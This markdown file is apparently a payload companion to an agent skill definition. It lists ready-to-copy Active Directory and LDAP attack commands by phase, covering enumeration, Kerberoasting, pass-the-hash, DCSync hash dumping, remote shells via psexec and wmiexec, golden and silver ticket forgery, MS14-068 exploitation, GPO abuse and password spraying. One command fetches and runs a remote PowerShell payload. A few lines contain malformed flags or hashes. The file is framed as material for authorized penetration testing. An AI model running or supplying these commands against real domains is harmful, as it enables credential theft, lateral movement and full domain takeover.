# Active Directory and LDAP Attack Payloads

> This file is a companion to `SKILL.md`, organizing common payloads for AD and LDAP attack testing by attack phase.
> Purpose: Quickly find commands for specific attack techniques, ready to copy for testing.
> All payloads are for authorized security testing only.

---

## Index

1. [Domain Reconnaissance](#1-domain-reconnaissance)
2. [LDAP Enumeration](#2-ldap-enumeration)
3. [Kerberos AS-REP Roasting](#3-kerberos-as-rep-roasting)
4. [Kerberoasting](#4-kerberoasting)
5. [Pass-the-Hash](#5-pass-the-hash)
6. [Pass-the-Ticket and Overpass-the-Hash](#6-pass-the-ticket-and-overpass-the-hash)
7. [DCSync Attack](#7-dcsync-attack)
8. [Lateral Movement](#8-lateral-movement)
9. [Golden Ticket Attack](#9-golden-ticket-attack)
10. [Silver Ticket Attack](#10-silver-ticket-attack)
11. [Domain Dominance](#11-domain-dominance)

---

## 1. Domain Reconnaissance

### NetBIOS Discovery with nbtscan

Discover live hosts and their NetBIOS names across the target network segment. NetBIOS information reveals machine names, domain membership, logged-on users, and the presence of domain controllers.

```bash
# Scan entire subnet for NetBIOS names
nbtscan 10.10.0.0/24

# Scan a specific range with verbose output
nbtscan -v 10.10.0.1-100

# Scan with specific bandwidth throttling
nbtscan -b 10.10.0.0/24

# Scan from a file of target IPs
nbtscan -f targets.txt
```

### DNS Enumeration for Domain Controllers

Locate domain controllers and services via DNS SRV records. This passive technique identifies the domain infrastructure without sending packets directly to target systems.

```bash
# Query SRV records for domain controllers
nslookup -type=srv _ldap._tcp.dc._msdcs.corp.local

# Query Kerberos service records
nslookup -type=srv _kerberos._tcp.corp.local

# Query global catalog
nslookup -type=srv _gc._tcp.corp.local

# Query KDC service
nslookup -type=srv _kerberos._tcp.dc._msdcs.corp.local

# Enumerate all SRV records for the domain
dig ANY corp.local @10.10.0.1
```

### SMB/NetBIOS Enumeration with enum4linux

Perform comprehensive SMB and NetBIOS enumeration against target systems. Enum4linux automates the collection of users, groups, shares, password policies, and OS information from domain-joined systems.

```bash
# Full enumeration of a target
enum4linux -a 10.10.0.1

# Enumerate with credentials
enum4linux -u 'corp\svc_user' -p 'Password123!' -a 10.10.0.1

# List users only
enum4linux -U 10.10.0.1

# List shares only
enum4linux -S 10.10.0.1

# Get OS information
enum4linux -o 10.10.0.1

# Get password policy
enum4linux -P 10.10.0.1

# Enumerate groups
enum4linux -G 10.10.0.1
```

### SMB/NetBIOS Enumeration with enum4linux-ng

Use the modernized enum4linux-ng tool for improved SMB enumeration with structured output and better error handling.

```bash
# Full enumeration with JSON output
enum4linux-ng -A 10.10.0.1 -oJ enum_results.json

# Enumerate users with authentication
enum4linux-ng -u 'corp\svc_user' -p 'Password123!' -U 10.10.0.1

# Enumerate shares
enum4linux-ng -S 10.10.0.1

# Target specific domain controller with timeout
enum4linux-ng -A 10.10.0.1 -t 30

# Output to JSON for automated parsing
enum4linux-ng -A 10.10.0.1 -oJ full_enum.json
```

### RPC Enumeration with rpcclient

Interact directly with Windows RPC interfaces to enumerate domain information through SAMR and LSA named pipes. Rpcclient provides granular access to user, group, and alias information.

```bash
# Connect to target with null session
rpcclient -U "" 10.10.0.1

# Connect with credentials
rpcclient -U 'corp\svc_user%Password123!' 10.10.0.1

# Once connected, enumerate domain users
rpcclient $> enumdomusers

# Enumerate domain groups
rpcclient $> enumdomgroups

# Query specific user details
rpcclient $> queryuser 0x1f4

# List group members
rpcclient $> querygroupmem 0x200

# Enumerate privileges
rpcclient $> enumprivs

# Query domain info
rpcclient $> querydominfo

# Enumerate aliases (local groups)
rpcclient $> enumalsgroups domain

# Get names from SIDs
rpcclient $> lookupsids S-1-5-21-XXXXXX-XXXXXX-XXXXXX-500
```

### Quick Host Discovery with CrackMapExec

Use CrackMapExec for rapid network discovery and basic enumeration across the target range.

```bash
# Discover live SMB hosts
crackmapexec smb 10.10.0.0/24

# Discover with domain and hostname details
crackmapexec smb 10.10.0.0/24 --gentilinux

# Enumerate sessions on target hosts
crackmapexec smb 10.10.0.0/24 -u 'svc_user' -p 'Password123!' --sessions

# Check for signed SMB
crackmapexec smb 10.10.0.0/24 --gen-relay-list relay_targets.txt
```

---

## 2. LDAP Enumeration

### Basic LDAP Queries with ldapsearch

Query the domain controller LDAP directory to enumerate users, groups, computers, and other AD objects. LDAP queries provide the most detailed and structured view of the Active Directory environment.

```bash
# Bind anonymously and query root DSE
ldapsearch -x -H ldap://10.10.0.1 -b "" -s base namingcontexts

# Enumerate all users in the domain
ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName displayName mail memberOf

# Enumerate all groups
ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" "(objectClass=group)" cn member

# Enumerate all computers
ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" "(objectClass=computer)" cn operatingSystem dnshostname

# Find domain admins
ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local))" sAMAccountName

# Enumerate Service Principal Names (SPNs)
ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Query trust relationships
ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" "(objectClass=trustedDomain)" cn trustDirection trustType

# Find accounts with DONT_REQ_PREAUTH (AS-REP Roastable)
ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```

### Comprehensive LDAP Dump with ldapdomaindump

Export the entire Active Directory structure into structured formats for offline analysis. Ldapdomaindump creates HTML, JSON, and CSV reports covering all domain objects and their attributes.

```bash
# Full domain dump with default settings
ldapdomaindump -u 'CORP\svc_ldap' -p 'Password123!' 10.10.0.1

# Dump to specific output directory
ldapdomaindump -u 'CORP\svc_ldap' -p 'Password123!' -o /tmp/ldap_dump 10.10.0.1

# Dump with LDAPS for encrypted transport
ldapdomaindump -u 'CORP\svc_ldap' -p 'Password123!' -ldaps 10.10.0.1

# Dump with custom BaseDN
ldapdomaindump -u 'CORP\svc_ldap' -p 'Password123!' -b "OU=Corp,DC=corp,DC=local" 10.10.0.1

# Generate only JSON output
ldapdomaindump -u 'CORP\svc_ldap' -p 'Password123!' --no-html --no-grep 10.10.0.1
```

### Advanced LDAP Enumeration with ldeep

Use ldeep for advanced LDAP enumeration including ACL extraction, delegation configuration, and trust enumeration with structured JSON output.

```bash
# Full domain enumeration
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 all

# Enumerate domain trusts
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 trusts

# Extract ACLs for analysis
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 acl

# List all delegations (constrained and unconstrained)
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 delegations

# Enumerate GPOs
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 gpos

# Extract zone transfers via LDAP
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 zones

# Search for specific user attributes
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 search "(sAMAccountName=admin*)" sAMAccountName mail
```

### BloodHound Data Collection

Collect Active Directory relationship data for graph-based attack path analysis using the Python BloodHound ingestor. BloodHound visualizes hidden attack paths that are difficult to identify through manual enumeration alone.

```bash
# Full collection with all methods
bloodhound-python -u 'svc_ldap' -p 'Password123!' -ns 10.10.0.1 -d corp.local -c All

# DC-only collection (no computer connections needed)
bloodhound-python -u 'svc_ldap' -p 'Password123!' -ns 10.10.0.1 -d corp.local -c DCOnly

# Collection with specific computer targets
bloodhound-python -u 'svc_ldap' -p 'Password123!' -ns 10.10.0.1 -d corp.local -c All -dc dc01.corp.local -v

# Collection with Kerberos authentication
bloodhound-python -d corp.local -ns 10.10.0.1 -u 'svc_ldap' -p 'Password123!' -c Group,LocalAdmin,Session,Trusts,ACL

# Collection against specific OU
bloodhound-python -u 'svc_ldap' -p 'Password123!' -ns 10.10.0.1 -d corp.local -c All -b "OU=Servers,DC=corp,DC=local"
```

---

## 3. Kerberos AS-REP Roasting

### Identifying AS-REP Roastable Users

AS-REP Roasting targets user accounts that have the "Do not require Kerberos preauthentication" flag enabled (DONT_REQ_PREAUTH). These accounts leak encrypted portions of their password hash in the AS-REP response, enabling offline cracking without any network authentication.

```bash
# Query all users for pre-auth disabled status
impacket-GetNPUsers corp.local/ -usersfile userlist.txt -format john -outputfile asrep_john.txt

# Query with hashcat format output
impacket-GetNPUsers corp.local/ -usersfile userlist.txt -format hashcat -outputfile asrep_hashcat.txt

# Query with valid credentials to enumerate all roastable users
impacket-GetNPUsers corp.local/svc_ldap:'Password123!' -request -format john -outputfile asrep_hashes.txt

# Query specific user
impacket-GetNPUsers corp.local/ -user svc_mssql -format john -outputfile asrep_svc_mssql.txt

# Query using NTLM hash instead of password
impacket-GetNPUsers corp.local/svc_ldap -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH -request -outputfile asrep_hashes.txt
```

### Cracking AS-REP Hashes

The extracted AS-REP hashes contain the encrypted timestamp encrypted with the user's password-derived key. Crack these offline using dictionary and rule-based attacks.

```bash
# Crack with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_john.txt

# Crack with hashcat (mode 18200 for Kerberos 5 AS-REP etype 23)
hashcat -m 18200 asrep_hashcat.txt /usr/share/wordlists/rockyou.txt

# Crack with rules for increased coverage
hashcat -m 18200 asrep_hashcat.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked results
john --show asrep_john.txt
hashcat -m 18200 asrep_hashcat.txt --show
```

---

## 4. Kerberoasting

### Requesting TGS Tickets with GetUserSPNs.py

Kerberoasting exploits service accounts registered with SPNs in Active Directory. The domain controller issues TGS tickets encrypted with the service account's password hash, which can be cracked offline. This attack requires only authenticated LDAP access and no special privileges.

```bash
# List all SPNs and request TGS tickets
impacket-GetUserSPNs corp.local/svc_ldap:'Password123!' -request -outputfile tgs_hashes.txt

# List SPNs without requesting tickets (reconnaissance first)
impacket-GetUserSPNs corp.local/svc_ldap:'Password123!' -no-preauth

# Request tickets for a specific user
impacket-GetUserSPNs corp.local/svc_ldap:'Password123!' -request-user svc_mssql -outputfile tgs_svc_mssql.txt

# Request tickets with alternative encryption types
impacket-GetUserSPNs corp.local/svc_ldap:'Password123!' -request -outputfile tgs_hashes.txt -ts

# Use NTLM hash for authentication
impacket-GetUserSPNs corp.local/svc_ldap -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH -request -outputfile tgs_hashes.txt
```

### Traditional Kerberoast Tool

Use the standalone kerberoast toolkit for TGS extraction and analysis on Kali Linux.

```bash
# Extract TGS tickets (requires Kerberos session)
python3 /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt tgs_ticket.kirbi

# Extract hashes from .kirbi ticket files
python3 /usr/share/kerberoast/extracttgtssc.py tgs_ticket.kirbi

# Convert kirbi to hashcat/john format
python3 /usr/share/kerberoast/kirbi2john.py tgs_ticket.kirbi > tgs_john.txt
```

### Cracking TGS Hashes

TGS tickets encrypted with RC4 (etype 23) are crackable at high speed. AES-256 (etype 18) tickets are significantly harder to crack, making RC4-downgrade detection a key defense indicator.

```bash
# Crack with John the Ripper (Kerberos TGS mode)
john --wordlist=/usr/share/wordlists/rockyou.txt tgs_hashes.txt

# Crack with hashcat mode 13100 (Kerberos TGS-REP etype 23)
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack with rules for better coverage
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule

# Show cracked results
john --show tgs_hashes.txt
hashcat -m 13100 tgs_hashes.txt --show
```

---

## 5. Pass-the-Hash

### Pass-the-Hash with CrackMapExec

Execute commands and access resources using NTLM hashes without knowing the plaintext password. CrackMapExec enables rapid hash spraying across the network to identify where credentials are valid.

```bash
# Test hash against a single target
crackmapexec smb 10.10.0.5 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx'

# Spray hash across subnet to find valid targets
crackmapexec smb 10.10.0.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx'

# Execute command via PTH
crackmapexec smb 10.10.0.5 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx' -x 'whoami'

# Dump SAM database
crackmapexec smb 10.10.0.5 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx' --sam

# Dump NTDS.dit via domain controller
crackmapexec smb 10.10.0.1 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx' --ntds

# Enumerate logged-on users
crackmapexec smb 10.10.0.5 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx' --loggedon-users
```

### Pass-the-Hash with Impacket psexec

Obtain a semi-interactive shell on the target system using Pass-the-Hash authentication via the SMB protocol. PsExec installs a temporary service on the target, which may trigger EDR/AV alerts.

```bash
# Get interactive shell via PTH
impacket-psexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx

# Execute a specific command
impacket-psexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx -c 'ipconfig /all'

# Use a specific service name for stealth
impacket-psexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx -service-name 'WindowsUpdate'

# Connect via specific SMB share
impacket-psexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx -share ADMIN$
```

### Pass-the-Hash with Impacket wmiexec

Execute commands via WMI for a stealthier alternative to psexec. WMI execution does not drop a service binary, making it harder to detect via file-based monitoring.

```bash
# Get semi-interactive shell via WMI
impacket-wmiexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx

# Execute a single command
impacket-wmiexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx -c 'net user'

# Execute with custom share for output
impacket-wmiexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx -share C$
```

### Pass-the-Hash with Impacket smbexec

Execute commands via SMB with minimal footprint. SMBExec uses a similar technique to psexec but with a different execution method, useful when psexec is blocked or detected.

```bash
# Get semi-interactive shell via SMB
impacket-smbexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx

# Execute single command
impacket-smbexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx -c 'systeminfo'
```

---

## 6. Pass-the-Ticket and Overpass-the-Hash

### Requesting TGT with getTGT.py

Obtain a Ticket Granting Ticket from the KDC using credentials or hashes, enabling Pass-the-Ticket attacks. The resulting ccache file can be used for Kerberos-based authentication.

```bash
# Request TGT with password
impacket-getTGT corp.local/svc_user:'Password123!'

# Request TGT with NTLM hash (Overpass-the-Hash)
impacket-getTGT corp.local/svc_user -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx

# Request TGT with AES key
impacket-getTGT corp.local/svc_user -aesKey a1b2c3d4e5f6

# Set the ticket for use
export KRB5CCNAME=svc_user.ccache
```

### Requesting Service Tickets with getST.py

Request service tickets for specific SPNs, perform S4U protocol transitions, and delegate access. The S4U extension enables constrained delegation exploitation.

```bash
# Request service ticket for CIFS
impacket-getST -spn cifs/dc01.corp.local corp.local/svc_user:'Password123!'

# S4U impersonation (constrained delegation abuse)
impacket-getST -spn cifs/dc01.corp.local -impersonate administrator corp.local/svc_deleg:'Password123!'

# S4U with self (protocol transition abuse)
impacket-getST -spn cifs/dc01.corp.local -impersonate administrator -self corp.local/svc_deleg:'Password123!'

# Use the service ticket
export KRB5CCNAME=administrator@cifs_dc01.corp.local.ccache
```

### Using Kerberos Tickets for Access

Apply cached Kerberos tickets for authentication without passwords or hashes. The KRB5CCNAME environment variable points the Kerberos library to the ticket cache.

```bash
# Use ticket with psexec
export KRB5CCNAME=administrator.ccache
impacket-psexec corp.local/administrator@dc01.corp.local -k -no-pass

# Use ticket with wmiexec
export KRB5CCNAME=administrator.ccache
impacket-wmiexec corp.local/administrator@dc01.corp.local -k -no-pass

# Use ticket with crackmapexec
export KRB5CCNAME=administrator.ccache
crackmapexec smb dc01.corp.local --use-kcache -u administrator
```

---

## 7. DCSync Attack

### Extracting Domain Hashes with secretsdump.py

Perform the DCSync attack by impersonating a domain controller to extract all password hashes from the NTDS.dit database. This requires Domain Admin or Replicator privileges and yields every user and computer hash in the domain.

```bash
# DCSync attack to dump all domain hashes
impacket-secretsdump corp.local/administrator@10.10.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx

# DCSync using password authentication
impacket-secretsdump corp.local/administrator:'P@ssw0rd!'@10.10.0.1

# Dump only NTLM hashes (fast mode)
impacket-secretsdump corp.local/administrator@10.10.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx -just-dc-ntlm

# Dump only specific user's hash
impacket-secretsdump corp.local/administrator@10.10.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx -just-dc-user "krbtgt"

# Extract NTDS.dit via SMB (alternative to DCSync)
impacket-secretsdump corp.local/administrator@10.10.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx -ntds ntds.dit

# Dump with output to file
impacket-secretsdump corp.local/administrator@10.10.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx -outputfile domain_dump
```

### Dumping Local SAM Remotely

Extract local account hashes from remote systems without domain admin privileges. This technique works with any local admin credentials on the target.

```bash
# Dump local SAM hashes
impacket-secretsdump corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx -local-auth

# Dump using local admin password
impacket-secretsdump ./administrator:'LocalPass123!'@10.10.0.5
```

---

## 8. Lateral Movement

### Lateral Movement with psexec.py

Deploy and execute payloads via the SMB ADMIN$ share. PsExec copies a service binary to the target, installs it as a Windows service, and provides a remote shell.

```bash
# Get shell with credentials
impacket-psexec corp.local/administrator:'P@ssw0rd!'@10.10.0.5

# Get shell with PTH
impacket-psexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx

# Execute command via Kerberos ticket
export KRB5CCNAME=admin.ccache
impacket-psexec corp.local/administrator@dc01.corp.local -k -no-pass

# Run specific command and capture output
impacket-psexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx -c 'net group "Domain Admins" /domain'
```

### Lateral Movement with wmiexec.py

Execute commands via Windows Management Instrumentation (WMI). This technique is stealthier than psexec because it does not drop a service binary or create a visible service.

```bash
# Get interactive shell
impacket-wmiexec corp.local/administrator:'P@ssw0rd!'@10.10.0.5

# Execute via PTH
impacket-wmiexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx

# Execute with output redirection via custom share
impacket-wmiexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx -share C$

# Execute with silent command (no output capture)
impacket-wmiexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b51404ee:3fxxx -silentcommand -c 'powershell -enc <base64>'
```

### Lateral Movement with smbexec.py

Execute commands using a temporary service via SMB. This approach uses a different service mechanism than psexec and can bypass some detection rules that specifically look for PsExec patterns.

```bash
# Get interactive shell
impacket-smbexec corp.local/administrator:'P@ssw0rd!'@10.10.0.5

# Execute via PTH
impacket-smbexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx

# Use specific share for output
impacket-smbexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx -share C$
```

### Lateral Movement with CrackMapExec

Spray credentials and execute commands across multiple targets simultaneously. CrackMapExec supports SMB, WinRM, LDAP, MSSQL, and SSH protocols for versatile lateral movement.

```bash
# Execute command across all hosts
crackmapexec smb 10.10.0.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx' -x 'hostname'

# Deploy and execute a payload via SMB
crackmapexec smb 10.10.0.5 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx' -x 'powershell -ep bypass -f \\10.10.0.100\share\payload.ps1'

# Dump LSA secrets
crackmapexec smb 10.10.0.5 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx' --lsa

# Dump SAM hashes
crackmapexec smb 10.10.0.5 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx' --sam

# Enumerate network interfaces
crackmapexec smb 10.10.0.5 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx' --interfaces
```

---

## 9. Golden Ticket Attack

### Forging Golden Tickets with ticketer.py

Create forged Kerberos TGT tickets using the krbtgt account hash. Golden Tickets provide persistent domain admin access that survives password resets for all accounts except krbtgt. This is one of the most powerful persistence techniques in AD.

```bash
# Forge Golden Ticket with krbtgt hash
impacket-ticketer -nthash 'krbtgt_ntlm_hash' -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local administrator

# Forge with specific user ID and groups
impacket-ticketer -nthash 'krbtgt_ntlm_hash' -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local -user-id 500 -groups 512,513,518,519,520 administrator

# Forge with extra SID for enterprise admin (cross-domain)
impacket-ticketer -nthash 'krbtgt_ntlm_hash' -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local -extra-sid S-1-5-21-9999999999-9999999999-9999999999-519 administrator

# Forge with custom lifetime (10 years)
impacket-ticketer -nthash 'krbtgt_ntlm_hash' -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local -duration 3650 administrator

# Use the Golden Ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec corp.local/administrator@dc01.corp.local -k -no-pass
```

### Golden Ticket via goldenPac.py (MS14-068)

Exploit the MS14-068 vulnerability to forge a Golden Ticket without prior domain admin access. This technique combines ticket forgery with automatic execution via the PAC vulnerability.

```bash
# Exploit MS14-068 with user credentials
impacket-goldenPac corp.local/lowpriv:'Password123!'@dc01.corp.local

# Exploit with specific target
impacket-goldenPac corp.local/lowpriv:'Password123!'@dc01.corp.local -target-ip 10.10.0.1

# Exploit and execute command
impacket-goldenPac corp.local/lowpriv:'Password123!'@dc01.corp.local -c 'whoami /all'
```

---

## 10. Silver Ticket Attack

### Forging Silver Tickets

Create forged Kerberos TGS tickets for specific services using the service account hash. Silver Tickets provide access to targeted services without contacting the KDC, making them stealthier than Golden Tickets.

```bash
# Forge Silver Ticket for CIFS (file share access)
impacket-ticketer -nthash 'svc_fileserver_hash' -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local -spn cifs/fileserver.corp.local -user-id 500 administrator

# Forge Silver Ticket for LDAP (AD queries)
impacket-ticketer -nthash 'dc01_hash' -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local -spn ldap/dc01.corp.local -user-id 500 administrator

# Forge Silver Ticket for HOST (service management)
impacket-ticketer -nthash 'target_host_hash' -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local -spn host/target.corp.local -user-id 500 administrator

# Forge Silver Ticket for HTTP (web services)
impacket-ticketer -nthash 'svc_web_hash' -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local -spn http/webapp.corp.local -user-id 500 administrator

# Use Silver Ticket for access
export KRB5CCNAME=administrator.ccache
impacket-psexec corp.local/administrator@fileserver.corp.local -k -no-pass -target-ip 10.10.0.10
```

---

## 11. Domain Dominance

### GPO Abuse for Persistence

Modify existing Group Policy Objects or create new GPOs to deploy malicious settings, scheduled tasks, or scripts across the entire domain. GPO abuse provides a powerful persistence mechanism that affects all systems within the GPO scope.

```bash
# Enumerate GPOs with ldeep
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 gpos

# Enumerate GPO with crackmapexec
crackmapexec smb 10.10.0.1 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx' --gpo

# Create scheduled task via GPO (using compromised admin)
# Step 1: Connect to SYSVOL share
impacket-smbclient corp.local/administrator@10.10.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx

# Step 2: Modify GPO preferences XML
# Edit \\corp.local\SYSVOL\corp.local\Policies\{GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
```

### ACL and Delegation Exploitation

Exploit misconfigured Access Control Lists and Kerberos delegation settings for privilege escalation and persistent access. ACE misconfigurations are among the most common AD vulnerabilities found in enterprise environments.

```bash
# Enumerate ACLs for escalation paths
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 acl

# Enumerate delegation configurations
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 delegations

# Exploit constrained delegation with S4U
impacket-getST -spn cifs/dc01.corp.local -impersonate administrator corp.local/svc_deleg:'DelegPass123!'

# Use delegated ticket for access
export KRB5CCNAME=administrator.ccache
impacket-psexec corp.local/administrator@dc01.corp.local -k -no-pass
```

### Forest and Domain Trust Exploitation

Enumerate and exploit trust relationships between domains and forests for cross-boundary compromise. Trust attacks enable lateral movement beyond the initial domain boundary.

```bash
# Enumerate domain trusts
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 trusts

# Enumerate trust with crackmapexec
crackmapexec smb 10.10.0.1 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx' --trusted-for-delegation

# Query trust via LDAP
ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" "(objectClass=trustedDomain)" cn trustDirection trustType flatName

# Forge ticket with Extra SID for cross-domain access
impacket-ticketer -nthash 'child_krbtgt_hash' -domain-sid S-1-5-21-CHILD_SID -domain child.corp.local -extra-sid S-1-5-21-PARENT_SID-519 administrator
```

### Password Spraying and Brute Force

Perform credential testing across domain accounts using common passwords. This technique balances stealth with coverage by testing a small number of passwords against many accounts.

```bash
# Password spray with crackmapexec
crackmapexec smb 10.10.0.1 -u userlist.txt -p 'Spring2025!' --no-bruteforce

# Spray with delay to avoid lockout
crackmapexec smb 10.10.0.1 -u userlist.txt -p passlist.txt --no-bruteforce --delay 5000

# Spray against LDAP
crackmapexec ldap 10.10.0.1 -u userlist.txt -p 'Welcome123!' --no-bruteforce

# Check for password policies first
crackmapexec smb 10.10.0.1 -u 'svc_ldap' -p 'Password123!' --pass-pol
```
